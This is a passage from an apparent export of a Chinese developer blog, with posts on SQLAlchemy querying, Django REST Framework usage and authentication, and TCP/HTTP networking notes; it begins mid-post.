t_user.user_password AS t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user, t_news WHERE t_user.user_id = t_news.news_author GROUP BY t_user_user_name; 所以最终凑合得到这样的查询 &gt;&gt;&gt; User.query.filter(User.newses).all() 2018-07-15 11:09:17,584 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, t_user.user_password AS t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user, t_news WHERE t_user.user_id = t_news.news_author 2018-07-15 11:09:17,585 INFO sqlalchemy.engine.base.Engine {} [&lt;User &#39;tim_nick&#39;&gt;] 查询一个user发布过的所有news&gt;&gt;&gt; News.query.filter(News.news_author==1).all() 2018-07-15 11:29:42,306 INFO sqlalchemy.engine.base.Engine SELECT t_news.news_id AS t_news_news_id, t_news.news_date AS t_news_news_date, t_news.news_content AS t_news_news_content, t_news.news_title AS t_news_news_title, t_news.news_excerpt AS t_news_news_excerpt, t_news.news_status AS t_news_news_status, t_news.news_modified AS t_news_news_modified, t_news.news_category AS t_news_news_category, t_news.news_author AS t_news_news_author FROM t_news WHERE t_news.news_author = %(news_author_1)s 2018-07-15 11:29:42,306 INFO sqlalchemy.engine.base.Engine {&#39;news_author_1&#39;: 1} [&lt;News &#39;title of news item one&#39;&gt;, &lt;News &#39;title of news item two&#39;&gt;] 到这里一共有三张表，那么join这种联表查询也是ok的&gt;&gt;&gt; result = db.session.query(News.news_id, News.news_author, News.news_date, News.news_title, News.news_content, News.news_excerpt, News.news_status, News.news_modified, Newscate.cate_name, Newscate.cate_title, User.user_name, User.user_nickname).filter_by(news_id=1).join(Newscate, News.news_category == Newscate.cate_id).join(User, News.news_author == User.user_id).first() 2018-07-15 14:08:27,487 INFO sqlalchemy.engine.base.Engine SELECT t_news.news_id AS t_news_news_id, t_news.news_author AS t_news_news_author, t_news.news_date AS t_news_news_date, t_news.news_title AS t_news_news_title, t_news.news_content AS t_news_news_content, t_news.news_excerpt AS t_news_news_excerpt, t_news.news_status AS t_news_news_status, t_news.news_modified AS t_news_news_modified, t_newscat.cate_name AS t_newscat_cate_name, t_newscat.cate_title AS t_newscat_cate_title, t_user.user_name AS t_user_user_name, t_user.user_nickname AS t_user_user_nickname FROM t_news INNER JOIN t_newscat ON t_news.news_category = t_newscat.cate_id INNER JOIN t_user ON t_news.news_author = t_user.user_id WHERE t_news.news_id = %(news_id_1)s LIMIT %(param_1)s 2018-07-15 14:08:27,487 INFO sqlalchemy.engine.base.Engine {&#39;news_id_1&#39;: 1, &#39;param_1&#39;: 1} (1, 1, datetime.datetime(2018, 7, 15, 2, 41, 50), &#39;title of news item one&#39;, &#39;content of news item one&#39;, &#39;excerpt of news item one&#39;, &#39;normal&#39;, datetime.datetime(2018, 7, 15, 10, 41, 50), &#39;economy&#39;, &#39;economy title&#39;, &#39;Tim&#39;, &#39;tim_nick&#39;) 这里得到的是一个&lt;class &#39;sqlalchemy.util._collections.result&#39;&gt;对象 &gt;&gt;&gt; result.cate_name ## 可以这么访问数据 &#39;economy&#39; 查找所有用gmail注册的用户&gt;&gt;&gt;&gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;gmail&quot;)).all() 2018-07-15 13:50:56,237 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE %(user_email_1)s 2018-07-15 13:50:56,239 INFO sqlalchemy.engine.base.Engine {&#39;user_email_1&#39;: &#39;gmail&#39;} [] ##显然有问题 数据库里执行这句sql就能正确的找出gmail邮箱的user &gt;&gt;&gt; SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE &#39;%gmail%&#39; 于是改成 &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).all() 2018-07-15 13:54:08,541 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE %(user_email_1)s 2018-07-15 13:54:08,542 INFO sqlalchemy.engine.base.Engine {&#39;user_email_1&#39;: &#39;%gmail%&#39;} [(&#39;Tim&#39;,), (&#39;Django&#39;,), (&#39;Sally&#39;,), (&#39;john&#39;,)] ### 分页接口，limit,count这种怎么写？ 用标准的limit,count似乎并不困难 &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).all() [(&#39;Tim&#39;,)] &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).offset(2).all() [(&#39;Sally&#39;,)] offset超出了实际数据的总量如何？ &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).offset(10).all() [] 除了标准的limit方法以外，下面这个paginate方法返回了一个pagination object &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).paginate(2,1,False).items MYSQL分页limit速度太慢优化方法 Many to many relationship添加新的model的时候，旧的model import会报错 class Node(Base): __tablename__ = &quot;nodes&quot; __table_args__ = {&quot;useexisting&quot;: True} ## 关键是这个 这样db.create_all()的时候也不会去动现有的表里面的数据 many-to-many-relationship依赖于第三张表 association_table = db.Table(&#39;association&#39;, db.Model.metadata, db.Column(&#39;left_id&#39;, db.Integer, db.ForeignKey(&#39;left.id&#39;)), db.Column(&#39;right_id&#39;, db.Integer, db.ForeignKey(&#39;right.id&#39;)) ) class Parent(db.Model): __tablename__ = &#39;left&#39; id = db.Column(db.Integer, primary_key=True) children = db.relationship(&quot;Child&quot;, secondary=association_table) class Child(db.Model): __tablename__ = &#39;right&#39; id = db.Column(db.Integer, primary_key=True) ## 添加数据 p = Parent() c = Child() p.children.append(c) db.session.add(p) db.session.commit() student_identifier = db.Table(&#39;student_identifier&#39;, db.Column(&#39;class_id&#39;, db.Integer, db.ForeignKey(&#39;classes.class_id&#39;)), db.Column(&#39;user_id&#39;, db.Integer, db.ForeignKey(&#39;students.user_id&#39;)) ) class Student(db.Model): __tablename__ = &#39;students&#39; user_id = db.Column(db.Integer, primary_key=True) user_fistName = db.Column(db.String(64)) user_lastName = db.Column(db.String(64)) user_email = db.Column(db.String(128), unique=True) class Class(db.Model): __tablename__ = &#39;classes&#39; class_id = db.Column(db.Integer, primary_key=True) class_name = db.Column(db.String(128), unique=True) children = db.relationship(&quot;Student&quot;, secondary=student_identifier) s = Student() c = Class() c.children.append(s) db.session.add(c) db.session.commit() ## 查询数据 db.session.query(Class).all()[0].children ##得到一个Student的list Class.query.with_parent(user_id) ## 获得一个student上的所有课程 有时候用db.session.query去查，有时候用Model.query去查 参考tutorialsqueryapi","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"sql","slug":"sql","permalink":"https://haldir65.github.io/tags/sql/"}]},{"title":"django学习记录","date":"2018-06-12T22:40:01.000Z","path":"2018/06/12/2018-06-12-django-the-pony/","text":"首先是几个常用命令 virtualenv --no-site-packages venv ## virtualenv好习惯 source venv/bin/activate ## windows下应该是Scripts/activate.bat这个文件 deactivate ## 退出 python manage.py mkemigrations app1 app2 python manage.py migrate python manage.py runserver django-admin startproject mysite ## 创建项目 django-admin startapp app1 ## 创建app python manage.py runserver ## 本地运行，默认8000端口 python manage.py runserver 8080 ## 端口也可以自己决定 python manage.py migrate ##创建了新的model，数据库需要建表 python manage.py createsuperuser ## 创建admin 需要注意的是，runserver命令多数情况下能够实现自动reload，比如修改了一个py文件。但如果是创建了一个新的文件，还是需要重新跑一遍的 settings.py中的SECRET_KEY不应该对外公布 models简化了建表操作，添加的str方法类似于将Object类型的数据展示为String的方法 from django.db import models class Question(models.Model): # ... def __str__(self): return self.question_text class Choice(models.Model): # ... def __str__(self): return self.choice_text 官方tutorial中的url和view的匹配也很简单 def detail(request, question_id): return HttpResponse(&quot;You&#39;re looking at question %s.&quot; % question_id) def results(request, question_id): response = &quot;You&#39;re looking at the results of question %s.&quot; return HttpResponse(response % question_id) def vote(request, question_id): return HttpResponse(&quot;You&#39;re voting on question %s.&quot; % question_id) from django.urls import path from . import views urlpatterns = [ # ex: /polls/ path(&#39;&#39;, views.index, name=&#39;index&#39;), # ex: /polls/5/ path(&#39;&lt;int:question_id&gt;/&#39;, views.detail, name=&#39;detail&#39;), # ex: /polls/5/results/ path(&#39;&lt;int:question_id&gt;/results/&#39;, views.results, name=&#39;results&#39;), # ex: /polls/5/vote/ path(&#39;&lt;int:question_id&gt;/vote/&#39;, views.vote, name=&#39;vote&#39;), ] 安装mysql:首先是virtualenvpip install mysql-connector-python mysql-connector-python 在ununtu上使用uwsgi和nginx运行django application uwsgi.conf文件里面需要注意的有这么一条[uwsgi]module = somefile:app ## 当前目录下有一个somefile.py文件，里面有一个app = Flask(name) requirements.txt的生成和使用当然都要在virtualenv中了 (venv) $ pip freeze &gt; requirements.txt # 创建(venv) $ pip install -r requirements.txt ##使用 127.0.0.1和0.0.0.0的区别我尝试在vps(216.216.216.216)上运行django应用 python manage.py 17289 ##随便挑一个端口curl localhost:17289 ## 网页的html response展示出来 于是尝试在本地windows上浏览器中输入 216.216.216.216:17289 没反应，使用postman，没效果。本地curl，curl –trace 依旧没效果。看下防火墙sudo uwf status # inactive最终找到了running-django-server-on-localhost 其实只要改用0.0.0.0就可以了 python manage.py runserver 0.0.0.0:8000python manage.py runserver HERE.IS.MY.IP:8000 #或者使用实际的地址 whats-the-difference-between-ip-address-0-0-0-0-and-127-0-0-1 In simple terms: Listening on 0.0.0.0 means listening from anywhere that has network access to this computer, for example, from this very computer, from local network or from the Internet, while listening on 127.0.0.1 means only listen from this very computer python manage.py shell python manage.py plus_shell drf官方文档 在ubuntu服务器上搭配nginx部署django应用创建一个myconf.ini文件 uwsgi –ini myconf.ini 还有，多数时候会热更新，但比如我更改了PaginationClass，还是得重新runserver才能获得理想的结果 目前DRF不支持通过一个Post请求创建一个list of nested objects 自定义接口返回格式ListCreateAPIView中override create方法 def create(self, request, *args, **kwargs): serializer = self.get_serializer(data=request.data) if not serializer.is_valid(raise_exception=False): return Response({&quot;Fail&quot;: &quot;blablal&quot;, status=status.HTTP_400_BAD_REQUEST) self.perform_create(serializer) headers = self.get_success_headers(serializer.data) return Response({&quot;Success&quot;: &quot;msb blablabla&quot;}, status=status.HTTP_201_CREATED, headers=headers) post和get请求都变得非常轻松 class CountryView(APIView): def get(self, request, format=None): snippets = County.objects.all() serializer = CountySimpleSerilizer(snippets, many=True) return Response(serializer.data) def post(self, request, format=None): serializer = CountySimpleSerilizer(data=request.data) if serializer.is_valid(): serializer.save() return responses.JsonResponse(serializer.data, status=status.HTTP_201_CREATED) return responses.JsonResponse(data={&quot;name&quot;,&quot;bad post request&quot;}, status=status.HTTP_400_BAD_REQUEST) python manage.py dbshell ##用于在命令行中直接查看数据库.help 查看在这个shell中可以用的一些操作.tables 查看当前创建的所有的表 这个不要加分号DROP TABLE appname_model; 删表 这个要加分号 注意，删了表之后，还得把对应的migrations中的文件删掉，否则migrate无效 pk其实就是primary_key的意思 Object.objects.get(id=1) Object.objects.get(pk=1) ## 看清楚了，是两个下划线 User.objects.filter(pk__in=[1,2,3]) User.objects.filter(pk__gt=10) User.objects.filter(pk__lt=10) nested relations { &quot;detail&quot;: &quot;Method \\&quot;GET\\&quot; not allowed.&quot; } 随便继承一个APIView，只写了post方法，使用GET方法就会得到这个response urlPatterns的一些东西如果url中有空格的话就直接换成%20urls.py里面写的主要是一堆正则表达式 urlpatterns = [ url(r&#39;^profiles/(?P&lt;username&gt;[\\w\\ ]+)/?$&#39;, ProfileRetrieveAPIView.as_view()), url(r&#39;^profiles/(?P&lt;username&gt;\\w+)/follow/?$&#39;, ProfileFollowAPIView.as_view()), ] 第一行的意思是访问 /profiles/你想要查找的userName 这个链接就会交给后面这个View lookup_field和lookup_url_kwarg都是定义在GenericApiView这个Class上的 class GenericAPIView(views.APIView): &quot;&quot;&quot; Base class for all other generic views. &quot;&quot;&quot; queryset = None serializer_class = None # If you want to use object lookups other than pk, set &#39;lookup_field&#39;. # For more complex lookup requirements override `get_object()`. lookup_field = &#39;pk&#39; lookup_url_kwarg = None # The filter backend classes to use for queryset filtering filter_backends = api_settings.DEFAULT_FILTER_BACKENDS # The style to use for queryset pagination. pagination_class = api_settings.DEFAULT_PAGINATION_CLASS rest-framework的文档是这么说的 lookup_field - The model field that should be used to for performing object lookup of individual model instances. Defaults to ‘pk’. Note that when using hyperlinked APIs you’ll need to ensure that both the API views and the serializer classes set the lookup fields if you need to use a custom value.lookup_url_kwarg - The URL keyword argument that should be used for object lookup. The URL conf should include a keyword argument corresponding to this value. If unset this defaults to using the same value as lookup_field 简言之，就是lookup_field就是把url里面传进来的参数当做model的什么field来查，比如model是Customer，primarykey是customername，默认的lookup_field就是这个主键。客户端的url需要传上来一个customername，然后就会根据这个customername去Customer.objects.filter(customername=”xxx”)去找。如果定义lookup_field为customer_age，就会把客户端传上来的参数当做一个customer_age去查找,Customer.objects.filter(customer_age=”xxx”) 关于这个继承关系，CreateAPIView，ListAPIView，RetrieveAPIView，DestroyAPIView这些全都是继承了GenericAPIView，并各自继承了mixin，扩展出post,get,post,delete等方法。 mixins.ListModelMixin，定义了一个list方法，返回一个queryset列表，对应GET方法mixins.CreateModelMixin，定义了一个create方法，创建一个实例，对应POST请求mixins.RetrieveModelMixin，定义了一个retrieve方法，对应GET请求mixins.UpdateModelMixin，定义一个update方法，对应PUT/PATCH请求 ##在models的Filed中定义一个 createdAt = serializers.SerializerMethodField(method_name=&#39;get_created_at&#39;) ##意味着这个field要调用一个自定义的方法去获取 updatedAt = serializers.SerializerMethodField(method_name=&#39;get_updated_at&#39;) ##filed还有一个source的概念: The name of the attribute that will be used to populate the field. 默认是这个field的name，比如可以定义为model的一个方法，也可以定义为一个model的field ##serializer里面可以自定义model中不存在的field customField = RelatedField(many=True, required=False, source=&#39;tags&#39;) ## 这个tags是存在的，customField是不存在这个model中的 ##这样做就很有意思了，因为从数据库里查出来的object可能就那么点信息，客户端希望后台在response中添加一些原本不存在于数据库model中的信息。就可以在某个已有变量的基础上扩展新的response 数据 ## 这里的insatnce是Serializer的model的实例 def get_created_at(self, instance): return instance.created_at.isoformat() 在serializer层面为model添加field。这里面要注意field还有read-only和write-only等区别关于slugFiled from django.utils.text importWell, if we give a string like ‘The new article title’ to slugify(), it returns ‘the-new-article-title’. Simple. slugField主要是为了让url好看点 Slugs are created mostly for the purpose of creating a nice, clean URL.Say for example, you have a site of user-generated posts, such as stackoverflow or quora.A user starts a post that has a title.Each post creates a separate web page based on the title.Now if a user asks the question, “How do you slugify text in Python”If a URL is created for this question, as is, with the spaces in them, the browser will insert %20 in place of each space. Therefore, the URL will be, How%20do%20you%20slugify%20text%20in%20PythonThis will work, but it looks extremely ugly and isn’t very human readable.So instead of having spaces in a URL, a slugified text is created that contains no spaces. Instead of spaces there are “-“ instead. Therefore, the URL will be, How-do-you-slugify-text-in-PythonThis looks much cleaner and is much more human readable. drf 的authorization默认需要是这样的: Authorization: Token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4bNote: If you want to use a different keyword in the header, such as Bearer, simply subclass TokenAuthentication and set the keyword class variable.If successfully authenticated, TokenAuthentication provides the following credentials.request.user will be a Django User instance.request.auth will be a rest_framework.authtoken.models.Token instance. jwt的logout或者踢人怎么做首先Token是放在内存里而不是db里的，另外要踢人的话，手动给这个user生成一个新的token搞清楚，踢人是服务器这边做(创建个新的Token或者让原有Token无效)，logout是客户端那边做(删除客户端本地存储的Token)。在html里面删掉Token可以这么干 &lt;script&gt; document.cookie = &quot;token=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/&quot;; location.href=&quot;/accounts/auth/&quot;; &lt;/script&gt; 对，就是简单的把token置空就行了 代码里认证的地方取的Header是WWW-Authenticate XXX，但客户端传的是Authorization。估计这是wsgi协议文档在这里相关的，记得Nginx好像也有这样的设定。WWW-Authenticate: Token 从django urlconf中抄来这些代码 from django.urls import path, re_path from . import views from django.urls import path from . import views urlpatterns = [ path(&#39;articles/2003/&#39;, views.special_case_2003), path(&#39;articles/&lt;int:year&gt;/&#39;, views.year_archive), path(&#39;articles/&lt;int:year&gt;/&lt;int:month&gt;/&#39;, views.month_archive), path(&#39;articles/&lt;int:year&gt;/&lt;int:month&gt;/&lt;slug:slug&gt;/&#39;, views.article_detail), ] ##底下这个和上面的差不多，底下用的是re_path，使用正则，年份只能四位，传给view的参数类型始终是str。还是有点小区别 urlpatterns = [ path(&#39;articles/2003/&#39;, views.special_case_2003), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/$&#39;, views.year_archive), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/$&#39;, views.month_archive), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/(?P&lt;slug&gt;[\\w-]+)/$&#39;, views.article_detail), ] 关于performance的issue，参考这里 class CustomerSerializer(serializers.ModelSerializer): # This can kill performance! order_descriptions = serializers.StringRelatedField(many=True) # So can this, same exact problem... orders = OrderSerializer(many=True, read_only=True) # This can kill performance! The code inside DRF that populates either CustomerSerializer does this:Fetch all customers. (Requires a round-trip to the database.)For the first returned customer, fetch their orders. (Requires another round-trip to the database.)For the second returned customer, fetch its orders. (Requires another round-trip to the database.)For the third returned customer, fetch its orders. (Requires another round-trip to the database.)For the fourth returned customer, fetch its orders. (Requires another round-trip to the database.)For the fifth returned customer, fetch its orders. (Requires another round-trip to the database.)For the sixth returned customer, fetch its orders. (Requires another round-trip to the database.)… you get the idea. Lets hope you don’t have too many customers! 所以要是有50个customer，就要执行50次查询，加上第一次获取所有Customer的数据库query。 优化后的代码只需要走2次数据库 queryset = queryset.prefetch_related(&#39;orders&#39;) ##干两件事，一个是获取所有user，一个是获取这些user的orer集合，一共就两次sql执行 其实这些东西在Django official document里面都提到过。 另外的优化就是用redis了,比如说Caching in Django With Redis pip install django-redis CACHES = { &#39;default&#39;: { &#39;BACKEND&#39;: &#39;django_redis.cache.RedisCache&#39;, &#39;LOCATION&#39;: &#39;127.0.0.1:6379&#39;, &quot;OPTIONS&quot;: { &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot;, }, }, } ## python manage.py shell 开一个shell，记得先把redis的server跑起来 from django.core.cache import cache #引入缓存模块 cache.set(&#39;k&#39;, &#39;12314&#39;, 30*60) #写入key为k，值为12314的缓存，有效期30分钟 cache.has_key(&#39;k&#39;) #判断key为k是否存在 cache.get(&#39;k&#39;) #获取key为k的缓存 一切OK的话说明可以用了 view.py from rest_framework.views import APIView from rest_framework import status from rest_framework.response import Response from .serializers import CourseSerializer from .models import Course from django.core.cache import cache import time def get_data_from_db(criteria_name): course = Course.objects.get(criteria=criteria_name) return course def get_readed_cache(criteria_name): #判断键是否存在 key = &#39;_key_course_query_criteria_&#39;+criteria_name if cache.has_key(key): data = cache.get(key) print(&#39;cache hit&#39;) else: #不存在，则获取数据，并写入缓存 data = get_data_from_db(criteria_name) #写入缓存 cache.set(key, data, 3600-int(time.time() % 3600)) print(&#39;sorry , no cache&#39;) return data # Create your views here. class CourseApiView(APIView): def post(self,request,format=None): serializer = CourseSerializer(data=request.data) if serializer.is_valid(): serializer.save() return Response(serializer.data,status=status.HTTP_201_CREATED) return Response(data={&quot;msg&quot;:&quot;invalid data&quot;},status=status.HTTP_400_BAD_REQUEST) def get(self, request, *args, **kwargs): critia = request.query_params.get(&#39;criteria&#39;,None) if critia: cached_data = get_readed_cache(critia) course = cached_data if course: serializer = CourseSerializer(course) return Response(serializer.data,status=status.HTTP_200_OK) return Response(&quot;not found&quot;,status=status.HTTP_404_NOT_FOUND) drf默认的admin pannel可以自定义样式和功能这人的博客不错 querySet里面有一个_set在moderl中没有声明related_name的情况下，需要通过_set来反向查找model For example, if Product had a many-to-many relationship with User, named purchase, you might want to write a view like this: class PurchasedProductsList(generics.ListAPIView): &quot;&quot;&quot; Return a list of all the products that the authenticated user has ever purchased, with optional filtering. &quot;&quot;&quot; model = Product serializer_class = ProductSerializer filter_class = ProductFilter def get_queryset(self): user = self.request.user return user.purchase_set.all() filter_backend是定义在GenericAPIView中的，所以要使用这个属性得用GenericAPIView nested relations json web token authentication pip install djangorestframework-jwt ##settings.py REST_FRAMEWORK = { &#39;DEFAULT_AUTHENTICATION_CLASSES&#39;: ( &#39;rest_framework.authentication.BasicAuthentication&#39;, &#39;rest_framework.authentication.SessionAuthentication&#39;, # &#39;rest_framework.authentication.TokenAuthentication&#39;, &#39;rest_framework_jwt.authentication.JSONWebTokenAuthentication&#39;, # 加入此行 ), } ## urls.py urlpatterns = [ ... # url(r&#39;api-auth-token/&#39;, authtoken_views.obtain_auth_token), # drf自带的token认证 url(r&#39;login/&#39;, jwt_authtoken_views.obtain_jwt_token), # 加此行，jwt认证 ] 然后通过post请求127.0.0.1/login/,body中添加username和password得到这样的response { &quot;token&quot;: &quot;someweirdwords---------&quot; } 下次请求的时候带上这个Header就好了 &quot;Authorization&quot;: &quot;JWT someweirdwords---------&quot; 通过manage.py创建user的方式： user@host&gt; manage.py shell &gt;&gt;&gt; from django.contrib.auth.models import User &gt;&gt;&gt; user=User.objects.create_user(&#39;John&#39;, password=&#39;password123&#39;) &gt;&gt;&gt; user.is_superuser=False &gt;&gt;&gt; user.is_staff=False &gt;&gt;&gt; user.save() 用jwt去请求需要authentication的接口时，header里面得带上一个 Authorization: Token 登录.接口.返回的token 注意Token这个单词后面有一个空格 caching django with redisredirect in django","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"django","slug":"django","permalink":"https://haldir65.github.io/tags/django/"}]},{"title":"网络通信手册-2","date":"2018-04-26T13:00:02.000Z","path":"2018/04/26/2018-04-26-network-manual-2/","text":"OkHttp通过ConnectionPool做到tcp连接复用（在Timeout内）,所以并不是每个http都去建立一个tcp连接自定义通讯协议，使用java socket实现客户端和服务端。需要注意的是分包问题和黏包问题 1. http请求中tcp连接的复用(http -keep alive是应用层的实现，与tcp kkepalive那个2小时没关系)2. 自定义通讯协议http这种属于应用层的协议定义了每个数据包的结构是怎样的。在一些场合下，比如追求通讯速度，自定义加密手段，可能需要自定义结构体。自己用Socket实现一套server-clinent通讯模型其实不难。server这边，先确定自己对外公布的ip,port。然后起一个serverSocket，死循环去accept，每次accept到一个就添加到一个列表中，同时用线程池去执行一个死跑从socket中read的runnable。client这边，根据server的ip和port去连接上，client主动发消息(byte，int,String类型都行)，server这边读到信息，给出response，clinent再读取server的回话，就跟两个人之间你一句我一句说话一样。整个过程中 保持了长连接,只要任何一方没有手动设置socket.setSoTimeout的话，放一晚上都不会断开。 一个重点是双方发送的消息格式，即两个人交流的语言，如果全部是String的话，那就跟http很像了，当然任何数据格式从socket发出去最终都是以byte的形式发出去的(比如string会用utf-8或者gbk编码成byte数组)。google的protoBuffer最重要的两个方法writeTo(object转成byte数组)和parseFrom(byte数组转成object)。 基于Java Socket的自定义协议，实现Android与服务器的长连接（二），基于这篇文章，可以将数据类型定义为统一的protocol，protocol的要素包括: 协议版本数据类型（数据类协议，数据ack类协议，心跳类协议，心跳ack类协议）数据长度(这很重要)消息id扩展字段 协议版本要做到向后兼容，基本上只添加数据实体不删除数据实体就可以了数据类型必需的三个要素是：长度，版本号，数据类型 (比方说0表示业务数据，1表示数据ack,2表示心跳，3表示心跳ack)。扩展字段类似于extra，可以用json或者别的什么去实现。 3. tcp的分包和粘包问题tcp发包的时候，如果一个包过大，会拆成两个包发(分包)。如果太小，发送方会攒着和下一个包一起发（粘包），tcp为了提高效率(使用Nagle算法)会缓冲N个包后再一起发出去。作为接收方并不知道收到的包是一个完整的包还是被拆分的还是由两个包合并而来。 可能发生分包和粘包的原因包括：1、要发送的数据大于TCP发送缓冲区剩余空间大小，将会发生拆包。 2、待发送数据大于MSS（最大报文长度），TCP在传输前将进行拆包。 3、要发送的数据小于TCP发送缓冲区的大小，TCP将多次写入缓冲区的数据一次发送出去，将会发生粘包。 4、接收数据端的应用层没有及时读取接收缓冲区中的数据，将发生粘包。 我们都知道TCP属于传输层的协议，传输层除了有TCP协议外还有UDP协议。那么UDP是否会发生粘包或拆包的现象呢？答案是不会。UDP是基于报文发送的，从UDP的帧结构可以看出，在UDP首部采用了16bit来指示UDP数据报文的长度，因此在应用层能很好的将不同的数据报文区分开，从而避免粘包和拆包的问题。而TCP是基于字节流的，虽然应用层和TCP传输层之间的数据交互是大小不等的数据块，但是TCP把这些数据块仅仅看成一连串无结构的字节流，没有边界；另外从TCP的帧结构也可以看出，在TCP的首部没有表示数据长度的字段，基于上面两点，在使用TCP传输数据时，才有粘包或者拆包现象发生的可能。 虽然有分包和粘包问题，但是作为传输层的tcp能够保证发送出去的顺序和接收到的顺序是一致的。那么基本的解决方法也很成熟了： 1、发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度，这样接收端在接收到数据后，通过读取包首部的长度字段，便知道每一个数据包的实际长度了。2、发送端将每个数据包封装为固定长度（不够的可以通过补0填充），这样接收端每次从接收缓冲区中读取固定长度的数据就自然而然的把每个数据包拆分开来。3、可以在数据包之间设置边界，如添加特殊符号，这样，接收端通过这个边界就可以将不同的数据包拆分开。 另外，http协议是通过添加换行符“ /r/n”这种形式来解决上述问题的参考TCP粘包，拆包及解决方法 4. java这边socket的inputStream的read方法是会堵塞的就是read方法一直不返回，Socket只是一座桥梁，并不像本地文件一样，所以无法知道对方是否把话说完了。只有一方调用socket的close方法时才会发送EOF结束符，另一方的read = -1 才能成立，否则read方法就堵塞在那里。InputStream有一个available()方法：an estimate of the number of bytes that can be read (or skippedover) from this input stream without blocking or 0 when it reaches the end of the input stream.oves) 。不要把这个方法中的返回值当做这个流中所有可能数据的总和(多数情况下这种猜测是错误的)。 tcp的backlog变量 建立TCP连接时需要发送同步SYN报文，然后等待确认报文SYN+ACK，最后再发送确认报文ACK。 如果应用层不能及时接受已被TCP接受的连接，这些连接可能占满整个连接队列，新的连接请求可能不被响应而会超时。如果一个连接请求SYN发送后，一段时间后没有收到确认SYN+ACK，TCP会重传这个连接请求SYN两次，每次重传的时间间隔加倍，在规定的时间内仍没有收到SYN+ACK，TCP将放弃这个连接请求，连接建立就超时了。 JAVA Socket超时浅析 BufferedWriter的主要原理是内部保留了一个char[]的数组，每次外部调用write的时候，不是直接写到underlying 的output中，而是system.arrayCopy到自己的char[]数组中，等发现char[]数组填满了，才去flushBuffer，就是把所有缓存的内容一次性写到底层的outputStream中。因为outputStream是一个字节一个字节去写的，每次写都要调用io操作，而io操作是很耗费资源的。所以bufferedWriter一次性写大量的数据，能够有效减少io次数，提高性能。 以TCP/IP协议为例，如何通过wireshark抓包分析？ 使用Nginx代理ws为wss协议 CRSF Content Security Policy 入门教程两种方式设置csp白名单，一种是服务器在response的header中添加’Content-Security-Policy’这个header，另一种是在html中写meta标签 &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; http请求是一行一行的文字，contentType only affects the body/document.you can use any ISO-8859-1 characters in the header.。ISO-8859-1不支持中文，所以header里面的东西不能写中文。body和path里面随意了 //网页上传excel表格的headerContent-Disposition: form-data; name=”files[]” filename=”sample.xls”Content-Type: application/vnd.ms-excel html里面上传文件一般是ajax对象send一个FormData出去，也有Base64编码一遍然后在服务端base64解码的。主要是html5标准中添加了新的FileReader接口，可以读取客户端文件内容，所以很多开发就调用FileReader的readAsDataURL方法去将文件的内容变成DATA URL形式的字符串不过这么干还是有缺点的 Data URL形式的图片不会被浏览器缓存，这意味着每次访问这样页面时都被下载一次，但可通过在css文件的background-image样式规则使用Data URI Scheme，使其随css文件一同被浏览器缓存起来）。 Base64编码的数据体积通常是原数据的体积4/3，也就是Data URL形式的图片会比二进制格式的图片体积大1/3。 移动端性能比较低。 域名解析之dig,host,nslookup命令好用的命令 dig +trace baidu.comnslookup www.youtube.com 1.1.1.1 //指定server，国内因为dns污染，返回的结果是错误的nslookup -vc google.com 8.8.8.8 // -vc是指强制走tcp查询dnsnslookup -d www.163.com //显示ttlnslookup -&gt; set debug -&gt; www.163.com //这三条走完是一样的，类似于交互模式dig挖出DNS的秘密 详细的http-content-type表格关于content-type,找到一篇介绍关于Http header常用字段理解Http HeaderHttp底层TCP ,ACK 等等需要tcpcump结合wireShark抓包 下面是几个常见的Content-Type:1.text/html2.text/plain3.text/css4.text/javascript5.application/x-www-form-urlencoded6.multipart/form-data7.application/json8.application/xml…前面几个都很好理解，都是html，css，javascript的文件类型，后面四个是POST的发包方式。 非官方的mime-type大全MDN上收录的mime-typeX-Content-Type-Options:nosniff.就是说服务器返回的Response中如果包含这个header的话，script和styleSheet元素会拒绝错误的MIME类型的响应。主要是为了防止给予MIME类型的混淆攻击 Referrer Policy: unsafe-urlunsafe-url后台在response中返回一个302，并在response header中添加header:location。直接把前端网页重定向到新的位置 服务器压测工具参考DigitalOcean的文章] npm install -g loadtest ##一个node的压力测试的web clientloadtest -n 100 -k http://localhost:8000/api/somebackend # -n表示发送100次 -k 表示keep-aliveloadtest -c 10 –rps 200 http://mysite.com/ # -c表示client，创建10个client ， –rsp表示每秒的请求数量loadtest -k -H ‘Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8’ -H “User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36” –rps 1 https://www.baidu.com/注意： 